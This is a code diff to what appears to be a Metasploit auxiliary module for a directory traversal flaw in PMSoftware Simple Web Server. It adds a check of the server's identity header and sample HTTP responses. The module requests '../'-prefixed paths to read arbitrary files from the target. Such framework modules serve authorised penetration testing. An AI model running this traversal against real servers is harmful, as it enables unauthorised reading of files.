@@ -77,7 +77,22 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
+	def is_sws?
+		res = send_request_raw({'uri'=>'/'})
+		if res and res.headers['Server'].to_s =~ /PMSoftware\-SWS/
+			return true
+		else
+			return false
+		end
+	end
+
+
 	def run_host(ip)
+		if not is_sws?
+			print_error("#{ip}:#{rport} - This isn't a Simple Web Server")
+			return
+		end
+
 		uri = normalize_uri("../"*datastore['DEPTH'], datastore['FILEPATH'])
 		res = send_request_raw({'uri'=>uri})
 
@@ -106,3 +121,23 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 end
+
+=begin
+Vulnerable:
+< HTTP/1.1 200 Ok
+< Server: PMSoftware-SWS/2.3
+< Date: Thu, 07 Feb 2013 16:34:6 GMT
+< Accept-Ranges: bytes
+< Content-type: text/html
+< Content-Length: 1550
+
+Not vulnerable:
+
+< HTTP/1.1 200 Ok
+< Server: PMSoftware-SWS/2.3
+< Date: Thu, 07 Feb 2013 16:39:53 GMT
+< Accept-Ranges: bytes
+< Content-type: text/html
+< Content-Length: 1550
+
+=end
